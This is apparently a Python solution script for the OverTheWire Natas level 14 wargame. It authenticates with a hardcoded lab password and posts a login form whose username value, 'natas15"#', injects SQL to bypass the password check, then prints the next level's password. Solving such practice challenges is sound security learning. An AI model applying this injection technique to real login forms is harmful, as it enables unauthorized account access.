import requests
from bs4 import BeautifulSoup

url="http://natas14.natas.labs.overthewire.org"
auth_user="natas14"
auth_pass="qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP"
username='natas15"#'
natas_pass='hacked'

params={'username':username,'password':natas_pass,'submit':'Login'}
r = requests.post(url,auth=(auth_user,auth_pass),data=params)
soup = BeautifulSoup(r.text,features="lxml")

for par in soup.find_all('body'):
        if "password" in par.string:
                print(f"natas15 password: {par.string}")